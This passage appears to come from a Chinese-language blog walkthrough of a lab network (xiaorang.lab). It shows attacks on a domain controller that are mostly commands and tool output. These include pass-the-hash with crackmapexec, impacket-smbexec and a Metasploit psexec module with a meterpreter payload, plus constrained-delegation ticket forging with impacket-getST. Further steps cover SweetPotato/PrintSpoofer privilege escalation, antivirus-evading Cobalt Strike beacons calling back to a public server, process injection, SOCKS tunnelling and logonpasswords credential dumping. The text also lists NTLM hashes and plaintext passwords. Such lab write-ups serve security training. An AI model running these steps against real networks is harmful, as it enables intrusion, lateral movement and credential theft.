+<h3 id="crackmapexec"><a href="#crackmapexec" class="headerlink" title="crackmapexec"></a>crackmapexec</h3><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-operator">┌──</span>(matrix㉿matrix)<span class="hljs-operator">-</span>[<span class="hljs-operator">~/</span><span class="hljs-type">Desktop</span>]<br><span class="hljs-operator">└─</span>$ proxychains crackmapexec smb <span class="hljs-number">172.22</span>.<span class="hljs-number">8.15</span> <span class="hljs-operator">-</span>u administrator <span class="hljs-operator">-</span><span class="hljs-type">H</span> 2c9d81bdcf3ec8b1def10328a7cc2f08 <span class="hljs-operator">-</span>d xiaorang.lab <span class="hljs-operator">-</span>x <span class="hljs-string">&quot;type Users\Administrator\flag\flag03.txt&quot;</span><br><br>[proxychains] config file found: <span class="hljs-regexp">/etc/</span>proxychains4.conf<br>[proxychains] preloading <span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/x86_64-linux-gnu/</span>libproxychains.so.<span class="hljs-number">4</span><br>[proxychains] <span class="hljs-type">DLL</span> <span class="hljs-keyword">init</span>: proxychains<span class="hljs-operator">-</span>ng <span class="hljs-number">4.17</span><br><span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/python3/</span>dist<span class="hljs-operator">-</span>packages<span class="hljs-regexp">/cme/</span>cli.py:<span class="hljs-number">37</span>: <span class="hljs-type">SyntaxWarning</span>: invalid escape sequence &#x27;\ &#x27;<br>  formatter_class<span class="hljs-operator">=</span><span class="hljs-type">RawTextHelpFormatter</span>)<br><span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/python3/</span>dist<span class="hljs-operator">-</span>packages<span class="hljs-regexp">/cme/</span>protocols<span class="hljs-regexp">/smb/</span>smbexec.py:<span class="hljs-number">49</span>: <span class="hljs-type">SyntaxWarning</span>: invalid escape sequence &#x27;\p&#x27;<br>  stringbinding <span class="hljs-operator">=</span> &#x27;ncacn_np:<span class="hljs-operator">%</span>s[\pipe\svcctl]&#x27; <span class="hljs-operator">%</span> <span class="hljs-keyword">self</span>.__host<br><span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/python3/</span>dist<span class="hljs-operator">-</span>packages<span class="hljs-regexp">/cme/</span>protocols<span class="hljs-regexp">/smb/</span>smbexec.py:<span class="hljs-number">93</span>: <span class="hljs-type">SyntaxWarning</span>: invalid escape sequence &#x27;\&#123;&#x27;<br>  command <span class="hljs-operator">=</span> <span class="hljs-keyword">self</span>.__shell <span class="hljs-operator">+</span> &#x27;echo &#x27;<span class="hljs-operator">+</span> data <span class="hljs-operator">+</span> &#x27; <span class="hljs-operator">^&gt;</span> \\\\<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>\\&#123;&#125;\\&#123;&#125; <span class="hljs-number">2</span><span class="hljs-operator">^&gt;^&amp;</span><span class="hljs-number">1</span> <span class="hljs-operator">&gt;</span> <span class="hljs-operator">%</span><span class="hljs-type">TEMP</span><span class="hljs-operator">%</span>\&#123;&#125; <span class="hljs-operator">&amp;</span> <span class="hljs-operator">%</span><span class="hljs-type">COMSPEC</span><span class="hljs-operator">%</span> <span class="hljs-regexp">/Q /</span>c <span class="hljs-operator">%</span><span class="hljs-type">TEMP</span><span class="hljs-operator">%</span>\&#123;&#125; <span class="hljs-operator">&amp;</span> <span class="hljs-operator">%</span><span class="hljs-type">COMSPEC</span><span class="hljs-operator">%</span> <span class="hljs-regexp">/Q /</span>c del <span class="hljs-operator">%</span><span class="hljs-type">TEMP</span><span class="hljs-operator">%</span>\&#123;&#125;&#x27;.format(<span class="hljs-keyword">self</span>.__share_name, <span class="hljs-keyword">self</span>.__output, <span class="hljs-keyword">self</span>.__batchFile, <span class="hljs-keyword">self</span>.__batchFile, <span class="hljs-keyword">self</span>.__batchFile)<br><span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/python3/</span>dist<span class="hljs-operator">-</span>packages<span class="hljs-regexp">/cme/</span>protocols<span class="hljs-operator">/</span>winrm.py:<span class="hljs-number">324</span>: <span class="hljs-type">SyntaxWarning</span>: invalid escape sequence &#x27;\<span class="hljs-type">S</span>&#x27;<br>  <span class="hljs-keyword">self</span>.conn.execute_cmd(<span class="hljs-string">&quot;reg save HKLM\SAM C:<span class="hljs-subst">\\</span>windows<span class="hljs-subst">\\</span>temp<span class="hljs-subst">\\</span>SAM &amp;&amp; reg save HKLM\SYSTEM C:<span class="hljs-subst">\\</span>windows<span class="hljs-subst">\\</span>temp<span class="hljs-subst">\\</span>SYSTEM&quot;</span>)<br><span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/python3/</span>dist<span class="hljs-operator">-</span>packages<span class="hljs-regexp">/cme/</span>protocols<span class="hljs-operator">/</span>winrm.py:<span class="hljs-number">338</span>: <span class="hljs-type">SyntaxWarning</span>: invalid escape sequence &#x27;\<span class="hljs-type">S</span>&#x27;<br>  <span class="hljs-keyword">self</span>.conn.execute_cmd(<span class="hljs-string">&quot;reg save HKLM\SECURITY C:<span class="hljs-subst">\\</span>windows<span class="hljs-subst">\\</span>temp<span class="hljs-subst">\\</span>SECURITY &amp;&amp; reg save HKLM\SYSTEM C:<span class="hljs-subst">\\</span>windows<span class="hljs-subst">\\</span>temp<span class="hljs-subst">\\</span>SYSTEM&quot;</span>)<br>[proxychains] <span class="hljs-type">Strict</span> chain  <span class="hljs-operator">...</span>  <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">55556</span>  <span class="hljs-operator">...</span>  <span class="hljs-number">172.22</span>.<span class="hljs-number">8.15</span>:<span class="hljs-number">445</span>  <span class="hljs-operator">...</span>  <span class="hljs-type">OK</span><br>[proxychains] <span class="hljs-type">Strict</span> chain  <span class="hljs-operator">...</span>  <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">55556</span>  <span class="hljs-operator">...</span>  <span class="hljs-number">172.22</span>.<span class="hljs-number">8.15</span>:<span class="hljs-number">445</span>  <span class="hljs-operator">...</span>  <span class="hljs-type">OK</span><br>[proxychains] <span class="hljs-type">Strict</span> chain  <span class="hljs-operator">...</span>  <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">55556</span>  <span class="hljs-operator">...</span>  <span class="hljs-number">172.22</span>.<span class="hljs-number">8.15</span>:<span class="hljs-number">135</span>  <span class="hljs-operator">...</span>  <span class="hljs-type">OK</span><br><span class="hljs-type">SMB</span>         <span class="hljs-number">172.22</span>.<span class="hljs-number">8.15</span>     <span class="hljs-number">445</span>    <span class="hljs-type">DC01</span>             [<span class="hljs-operator">*</span>] <span class="hljs-type">Windows</span> <span class="hljs-type">Server</span> <span class="hljs-number">2022</span> <span class="hljs-type">Build</span> <span class="hljs-number">20348</span> x64 (name:<span class="hljs-type">DC01</span>) (domain:xiaorang.lab) (signing:<span class="hljs-type">True</span>) (SMBv1:<span class="hljs-type">False</span>)<br>[proxychains] <span class="hljs-type">Strict</span> chain  <span class="hljs-operator">...</span>  <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">55556</span>  <span class="hljs-operator">...</span>  <span class="hljs-number">172.22</span>.<span class="hljs-number">8.15</span>:<span class="hljs-number">445</span>  <span class="hljs-operator">...</span>  <span class="hljs-type">OK</span><br>[proxychains] <span class="hljs-type">Strict</span> chain  <span class="hljs-operator">...</span>  <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">55556</span>  <span class="hljs-operator">...</span>  <span class="hljs-number">172.22</span>.<span class="hljs-number">8.15</span>:<span class="hljs-number">445</span>  <span class="hljs-operator">...</span>  <span class="hljs-type">OK</span><br><span class="hljs-type">SMB</span>         <span class="hljs-number">172.22</span>.<span class="hljs-number">8.15</span>     <span class="hljs-number">445</span>    <span class="hljs-type">DC01</span>             [<span class="hljs-operator">+</span>] xiaorang.lab\administrator:2c9d81bdcf3ec8b1def10328a7cc2f08 (<span class="hljs-type">Pwn3d</span>!)<br>[proxychains] <span class="hljs-type">Strict</span> chain  <span class="hljs-operator">...</span>  <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">55556</span>  <span class="hljs-operator">...</span>  <span class="hljs-number">172.22</span>.<span class="hljs-number">8.15</span>:<span class="hljs-number">135</span>  <span class="hljs-operator">...</span>  <span class="hljs-type">OK</span><br>[proxychains] <span class="hljs-type">Strict</span> chain  <span class="hljs-operator">...</span>  <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">55556</span>  <span class="hljs-operator">...</span>  <span class="hljs-number">172.22</span>.<span class="hljs-number">8.15</span>:<span class="hljs-number">50271</span>  <span class="hljs-operator">...</span>  <span class="hljs-type">OK</span><br><span class="hljs-type">SMB</span>         <span class="hljs-number">172.22</span>.<span class="hljs-number">8.15</span>     <span class="hljs-number">445</span>    <span class="hljs-type">DC01</span>             [<span class="hljs-operator">+</span>] <span class="hljs-type">Executed</span> command <br><span class="hljs-type">SMB</span>         <span class="hljs-number">172.22</span>.<span class="hljs-number">8.15</span>     <span class="hljs-number">445</span>    <span class="hljs-type">DC01</span>             _________               __    <span class="hljs-keyword">_</span>                  <span class="hljs-keyword">_</span><br><span class="hljs-type">SMB</span>         <span class="hljs-number">172.22</span>.<span class="hljs-number">8.15</span>     <span class="hljs-number">445</span>    <span class="hljs-type">DC01</span>             <span class="hljs-operator">|</span>  <span class="hljs-keyword">_</span>   <span class="hljs-keyword">_</span>  <span class="hljs-operator">|</span>             [  <span class="hljs-operator">|</span>  (<span class="hljs-keyword">_</span>)                <span class="hljs-operator">/</span> <span class="hljs-operator">|</span><span class="hljs-keyword">_</span><br><span class="hljs-type">SMB</span>         <span class="hljs-number">172.22</span>.<span class="hljs-number">8.15</span>     <span class="hljs-number">445</span>    <span class="hljs-type">DC01</span>             <span class="hljs-operator">|</span><span class="hljs-keyword">_</span><span class="hljs-operator">/</span> <span class="hljs-operator">|</span> <span class="hljs-operator">|</span> \<span class="hljs-keyword">_</span><span class="hljs-operator">|</span><span class="hljs-operator">.--.</span>   <span class="hljs-operator">.---.</span>  <span class="hljs-operator">|</span> <span class="hljs-operator">|</span>  __  <span class="hljs-operator">.---.</span>  <span class="hljs-keyword">_</span> <span class="hljs-operator">.--.</span> `<span class="hljs-operator">|</span> <span class="hljs-operator">|-</span>&#x27;<br><span class="hljs-type">SMB</span>         <span class="hljs-number">172.22</span>.<span class="hljs-number">8.15</span>     <span class="hljs-number">445</span>    <span class="hljs-type">DC01</span>             <span class="hljs-operator">|</span> <span class="hljs-operator">|</span>   ( (`\] <span class="hljs-operator">/</span> <span class="hljs-regexp">/&#x27;`\] | | [  |/ /__\\[ `.-. | | |</span><br><span class="hljs-regexp">SMB         172.22.8.15     445    DC01             _| |_   `&#x27;.&#x27;. | \__.  | |  | || \__., | | | | | |,</span><br><span class="hljs-regexp">SMB         172.22.8.15     445    DC01             |_____| [\__) )&#x27;.___.&#x27;[___][___]&#x27;.__.&#x27;[___||__]\__/</span><br><span class="hljs-type">SMB</span>         <span class="hljs-number">172.22</span>.<span class="hljs-number">8.15</span>     <span class="hljs-number">445</span>    <span class="hljs-type">DC01</span>             <br><span class="hljs-type">SMB</span>         <span class="hljs-number">172.22</span>.<span class="hljs-number">8.15</span>     <span class="hljs-number">445</span>    <span class="hljs-type">DC01</span>             <br><span class="hljs-type">SMB</span>         <span class="hljs-number">172.22</span>.<span class="hljs-number">8.15</span>     <span class="hljs-number">445</span>    <span class="hljs-type">DC01</span>             <span class="hljs-type">Congratulations</span>! <span class="hljs-operator">!</span> <span class="hljs-operator">!</span><br><span class="hljs-type">SMB</span>         <span class="hljs-number">172.22</span>.<span class="hljs-number">8.15</span>     <span class="hljs-number">445</span>    <span class="hljs-type">DC01</span>             <br><span class="hljs-type">SMB</span>         <span class="hljs-number">172.22</span>.<span class="hljs-number">8.15</span>     <span class="hljs-number">445</span>    <span class="hljs-type">DC01</span>             flag03: flag&#123;c2ec4b1e<span class="hljs-operator">-</span>e463<span class="hljs-operator">-</span>4f63<span class="hljs-operator">-</span>b779<span class="hljs-operator">-</span>fe8e7d955b4f&#125;<br>                                                                   <br></code></pre></td></tr></table></figure>
+
+<h3 id="msf-psexec-1"><a href="#msf-psexec-1" class="headerlink" title="msf psexec"></a>msf psexec</h3><p>再练一下msf，注意格式问题，不要少0或者没有0</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs routeros">use exploit/windows/smb/psexec<br><span class="hljs-built_in">set</span> RHOSTS 172.22.8.15<br><span class="hljs-built_in">set</span> SMBUser administrator<br><span class="hljs-built_in">set</span> SMBPass 00000000000000000000000000000000:2c9d81bdcf3ec8b1def10328a7cc2f08<br><span class="hljs-built_in">set</span> SMBDomain xiaorang.lab<br><span class="hljs-built_in">set</span> PAYLOAD windows/x64/meterpreter/bind_tcp<br><span class="hljs-built_in">set</span> LPORT 54526<br>run<br></code></pre></td></tr></table></figure>
+
+<h3 id="impacket-smbexec"><a href="#impacket-smbexec" class="headerlink" title="impacket smbexec"></a>impacket smbexec</h3><p><strong>crackmapexec</strong>和<strong>impacket-smbexec</strong>本质都是用SMB协议远程认证和执行命令</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">proxychains impacket-smbexec -hashes :<span class="hljs-number">2</span><span class="hljs-keyword">c</span><span class="hljs-number">9</span>d<span class="hljs-number">81</span>bdcf<span class="hljs-number">3</span>ec<span class="hljs-number">8</span>b<span class="hljs-number">1</span>def<span class="hljs-number">10328</span>a<span class="hljs-number">7</span><span class="hljs-keyword">cc</span><span class="hljs-number">2</span>f<span class="hljs-number">08</span> xiaorang.lab/administrator<span class="hljs-title">@172</span>.<span class="hljs-number">22.8</span>.<span class="hljs-number">15</span><br></code></pre></td></tr></table></figure>
+
+<h2 id="约束委派"><a href="#约束委派" class="headerlink" title="约束委派"></a>约束委派</h2><p>还可以打约束委派</p>
+<p>查询域委派关系</p>
+<figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-comment"># 查询委派关系</span><br>proxychains impacket-findDelegation xiaorang.lab<span class="hljs-operator">/</span>Aldrich:&#x27;Matrix2025<span class="hljs-operator">!</span>&#x27; <span class="hljs-operator">-</span>dc-ip <span class="hljs-number">172.22</span>.<span class="hljs-number">8.15</span> <span class="hljs-operator">-</span>target-domain xiaorang.lab<br><br>proxychains impacket-findDelegation xiaorang.lab<span class="hljs-operator">/</span>Aldrich:&#x27;Matrix2025<span class="hljs-operator">!</span>&#x27; <span class="hljs-operator">-</span>dc-ip <span class="hljs-number">172.22</span>.<span class="hljs-number">8.15</span> <span class="hljs-operator">-</span>target-domain xiaorang.lab<br>[proxychains] config file <span class="hljs-params">found:</span> <span class="hljs-symbol">/etc/proxychains4.conf</span><br>[proxychains] preloading <span class="hljs-symbol">/usr/lib/x86_64-linux-gnu/libproxychains.so.4</span><br>[proxychains] DLL <span class="hljs-params">init:</span> proxychains-ng <span class="hljs-number">4.17</span><br>[proxychains] DLL <span class="hljs-params">init:</span> proxychains-ng <span class="hljs-number">4.17</span><br>[proxychains] DLL <span class="hljs-params">init:</span> proxychains-ng <span class="hljs-number">4.17</span><br>Impacket v0.<span class="hljs-number">13.0</span>.dev0 <span class="hljs-operator">-</span> Copyright Fortra, LLC and its affiliated companies <br><br>AccountName    AccountType  DelegationType                      DelegationRightsTo                                  SPN Exists <br><span class="hljs-operator">-</span>------------  <span class="hljs-operator">-</span>----------  <span class="hljs-operator">-</span>---------------------------------  <span class="hljs-operator">-</span>-------------------------------------------------  <span class="hljs-operator">-</span>---------<br>WIN2016$       Computer     Constrained w<span class="hljs-symbol">/</span> Protocol Transition  ldap<span class="hljs-symbol">/DC01.xiaorang.lab/xiaorang.lab</span>                 Yes        <br>WIN2016$       Computer     Constrained w<span class="hljs-symbol">/</span> Protocol Transition  ldap<span class="hljs-symbol">/DC01.xiaorang.lab</span>                              Yes        <br>WIN2016$       Computer     Constrained w<span class="hljs-symbol">/</span> Protocol Transition  ldap<span class="hljs-symbol">/DC01</span>                                           Yes        <br>WIN2016$       Computer     Constrained w<span class="hljs-symbol">/</span> Protocol Transition  ldap<span class="hljs-symbol">/DC01.xiaorang.lab/XIAORANG</span>                     Yes        <br>WIN2016$       Computer     Constrained w<span class="hljs-symbol">/</span> Protocol Transition  ldap<span class="hljs-symbol">/DC01/XIAORANG</span>                                  Yes        <br>WIN2016$       Computer     Constrained w<span class="hljs-symbol">/</span> Protocol Transition  ldap<span class="hljs-symbol">/DC01.xiaorang.lab/DomainDnsZones.xiaorang.lab</span>  Yes        <br>WIN2016$       Computer     Constrained w<span class="hljs-symbol">/</span> Protocol Transition  ldap<span class="hljs-symbol">/DC01.xiaorang.lab/ForestDnsZones.xiaorang.lab</span>  Yes        <br>WIN19-CLIENT$  Computer     Constrained w<span class="hljs-symbol">/</span> Protocol Transition  cifs<span class="hljs-symbol">/WIN2016.xiaorang.lab</span>                           No         <br>WIN19-CLIENT$  Computer     Constrained w<span class="hljs-symbol">/</span> Protocol Transition  cifs<span class="hljs-symbol">/WIN2016</span>                                        No         <br></code></pre></td></tr></table></figure>
+
+<p>存在从 <code>WIN2016$</code> 到 <code>DC01</code> 的约束委派, 并且委派的是 LDAP 服务</p>
+<p>利用 S4U 协议请求 ST 伪造 Administrator 用户</p>
+<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"># 利用委派生成票据<br>proxychains impacket-getST xiaorang.lab/WIN2016\$ -hashes :<span class="hljs-number">29231</span>c719dc07970ae7a73127417af9a -dc-ip <span class="hljs-number">172.22</span><span class="hljs-number">.8</span><span class="hljs-number">.15</span> -spn ldap/DC01.xiaorang.lab -impersonate administrator<br><br>proxychains impacket-getST xiaorang.lab/WIN2016\$ -hashes :<span class="hljs-number">29231</span>c719dc07970ae7a73127417af9a -dc-ip <span class="hljs-number">172.22</span><span class="hljs-number">.8</span><span class="hljs-number">.15</span> -spn ldap/DC01.xiaorang.lab -impersonate administrator<br><span class="hljs-string">[proxychains]</span> config file found: /etc/proxychains4.conf<br><span class="hljs-string">[proxychains]</span> preloading /usr/lib/x86_64-linux-gnu/libproxychains.so<span class="hljs-number">.4</span><br><span class="hljs-string">[proxychains]</span> DLL init: proxychains-ng <span class="hljs-number">4.17</span><br><span class="hljs-string">[proxychains]</span> DLL init: proxychains-ng <span class="hljs-number">4.17</span><br><span class="hljs-string">[proxychains]</span> DLL init: proxychains-ng <span class="hljs-number">4.17</span><br>Impacket v0<span class="hljs-number">.13</span><span class="hljs-number">.0</span>.dev0 - Copyright Fortra, LLC <span class="hljs-keyword">and</span> its affiliated companies <br><span class="hljs-string"></span><br><span class="hljs-string">[-]</span> CCache file <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> found. Skipping...<br><span class="hljs-string">[*]</span> Getting TGT <span class="hljs-keyword">for</span> user<br><span class="hljs-string">[proxychains]</span> Strict chain  ...  公网IP:<span class="hljs-number">55557</span>  ...  <span class="hljs-number">172.22</span><span class="hljs-number">.8</span><span class="hljs-number">.15</span>:<span class="hljs-number">88</span>  ...  OK<br><span class="hljs-string">[proxychains]</span> Strict chain  ...  公网IP:<span class="hljs-number">55557</span>  ...  <span class="hljs-number">172.22</span><span class="hljs-number">.8</span><span class="hljs-number">.15</span>:<span class="hljs-number">88</span>  ...  OK<br><span class="hljs-string">[*]</span> Impersonating administrator<br><span class="hljs-string">[*]</span> Requesting S4U2self<br><span class="hljs-string">[proxychains]</span> Strict chain  ...  公网IP:<span class="hljs-number">55557</span>  ...  <span class="hljs-number">172.22</span><span class="hljs-number">.8</span><span class="hljs-number">.15</span>:<span class="hljs-number">88</span>  ...  OK<br><span class="hljs-string">[*]</span> Requesting S4U2Proxy<br><span class="hljs-string">[proxychains]</span> Strict chain  ...  公网IP:<span class="hljs-number">55557</span>  ...  <span class="hljs-number">172.22</span><span class="hljs-number">.8</span><span class="hljs-number">.15</span>:<span class="hljs-number">88</span>  ...  OK<br><span class="hljs-string">[*]</span> Saving ticket <span class="hljs-keyword">in</span> <span class="hljs-symbol">administrator@</span>ldap_DC01.xiaorang.<span class="hljs-symbol">lab@</span>XIAORANG.LAB.ccache<br></code></pre></td></tr></table></figure>
+
+<p>成功获得票据，接下来的思路是利用票据进行 DCSync 导出域管 Hash 之后再去 psexec ，和上面差不多</p>
+<p>因为委派的是 LDAP 服务，直接 psexec 或者 wmiexec 过去也行，这里是绕了一个大弯子</p>
+<h1 id="cobalt-strike"><a href="#cobalt-strike" class="headerlink" title="cobalt strike"></a>cobalt strike</h1><p>这里我们再用CS过一遍题目。</p>
+<p>可以SweetPotato或者PrintSpoofer提权</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus">C:/迅雷下载/SweetPotato<span class="hljs-selector-class">.exe</span> -<span class="hljs-selector-tag">a</span> whoami<br>C:/迅雷下载/PrintSpoofer<span class="hljs-selector-class">.exe</span> -<span class="hljs-selector-tag">i</span> -c whoami<br><br>C:/迅雷下载/SweetPotato<span class="hljs-selector-class">.exe</span> -<span class="hljs-selector-tag">a</span> <span class="hljs-string">&quot;C:/迅雷下载/windows_x64_agent.exe -l 54522 -s matrix&quot;</span><br>./linux_x64_admin -c <span class="hljs-number">39.99</span>.<span class="hljs-number">228.12</span>:<span class="hljs-number">54522</span> -s matrix<br></code></pre></td></tr></table></figure>
+
+<p>启动CS server</p>
+<figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">./teamserver 公网IP <span class="hljs-keyword">matrix</span>@Tony5<br></code></pre></td></tr></table></figure>
+
+<p>启动client，并启动监听</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152235742.png" srcset="/img/loading.gif" lazyload alt="image-20250812020254223"></p>
+<p>这里试试免杀，用掩日</p>
+<p>传免杀马，直接执行，或者用甜土豆上一个system权限的CS</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">C:/迅雷下载/Qa50<span class="hljs-selector-class">.exe</span><br>C:/迅雷下载/SweetPotato<span class="hljs-selector-class">.exe</span> -<span class="hljs-selector-tag">a</span> <span class="hljs-string">&quot;C:/迅雷下载/Qa50.exe&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p>或者在CS里提权，会多出来几个会话</p>
+<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-built_in">shell</span> c:\\users\\public\\SweetPotato.exe -<span class="hljs-keyword">a</span> <span class="hljs-string">&quot;C:/迅雷下载/CS51.exe&quot;</span><br><span class="hljs-built_in">shell</span> C:/迅雷下载/SweetPotato.exe -<span class="hljs-keyword">a</span> <span class="hljs-string">&quot;C:/迅雷下载/CS51.exe&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152236124.png" srcset="/img/loading.gif" lazyload alt="image-20250812020003097"></p>
+<p>直接提权也是可以的：<code>getsystem</code></p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152236680.png" srcset="/img/loading.gif" lazyload alt="image-20250812020156133"></p>
+<h2 id="进程注入"><a href="#进程注入" class="headerlink" title="进程注入"></a>进程注入</h2><p>先进入进程列表</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152236365.png" srcset="/img/loading.gif" lazyload alt="image-20250812020422474"></p>
+<p>然后选择john的进程注入</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152236908.png" srcset="/img/loading.gif" lazyload alt="image-20250808082622506"></p>
+<p>john上线</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152236600.png" srcset="/img/loading.gif" lazyload alt="image-20250808082731834"></p>
+<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">shell</span><span class="language-bash"> <span class="hljs-built_in">type</span> \\tsclient\c\credential.txt</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152236030.png" srcset="/img/loading.gif" lazyload alt="image-20250812021307300"></p>
+<h2 id="cs-Socks-代理隧道"><a href="#cs-Socks-代理隧道" class="headerlink" title="cs Socks 代理隧道"></a>cs Socks 代理隧道</h2><p>右击开启代理</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152236880.png" srcset="/img/loading.gif" lazyload alt="image-20250808100158831"></p>
+<p>选socks5并确定端口</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152236957.png" srcset="/img/loading.gif" lazyload alt="image-20250812021441615"></p>
+<p>SOCKS代理的启动位置</p>
+<ul>
+<li>当你在 CS 的 Teamserver 控制台或客户端界面上选择某个 Beacon 会话（已上线的内网主机）并点击“Start SOCKS”时，<strong>SOCKS 代理服务实际上是在 Teamserver（也就是服务器端）上开启的</strong>，监听一个本地端口（比如 127.0.0.1:1080）。</li>
+<li>你本地的各种流量（浏览器、proxychains、nmap等工具）通过 SOCKS5 协议连到 Teamserver（server），Teamserver 再把这些流量通过 Beacon 隧道转发到目标内网主机，再由目标主机访问内网资源，把结果回传给你。</li>
+</ul>
+<p>可配置proxychains，应该是vps:55557；</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> vim /etc/proxychains4.conf<br></code></pre></td></tr></table></figure>
+
+<p>然后Kali RDP过去</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">proxychains xfreerdp3 /u:Aldrich /p:Ald@rLMWuy7Z!# /d:xiaorang.lab /v:172.22.8.46 /cert:ignore<br></code></pre></td></tr></table></figure>
+
+<p>Proxifier的话，可以用到什么程序就规定其走代理，或者规定访问什么网段时才走代理，全局的话会影响部分软件，比如tabby的ssh就断了。</p>
+<h2 id="配置转发监听器"><a href="#配置转发监听器" class="headerlink" title="配置转发监听器"></a>配置转发监听器</h2><p>选择一个会话，进行转发上线</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152236193.png" srcset="/img/loading.gif" lazyload alt="image-20250812023621728"></p>
+<p>填好host和port</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152236045.png" srcset="/img/loading.gif" lazyload alt="image-20250812023757179"></p>
+<p>这里我直接选择生成所有了</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152236075.png" srcset="/img/loading.gif" lazyload alt="image-20250812023900118"></p>
+<p>传过去，执行后门即可</p>
+<p>或者可以自己生成，好像只能stageless，配置好接收ip、域之类的就行。</p>
+<p>利用劫持执行，拿到system，</p>
+<p>利用 logonpasswords  获取凭证：<code>logonpasswords</code> 是 Cobalt Strike 中的一个命令，用于从目标系统中提取登录凭证，包括明文密码、哈希值等。  </p>
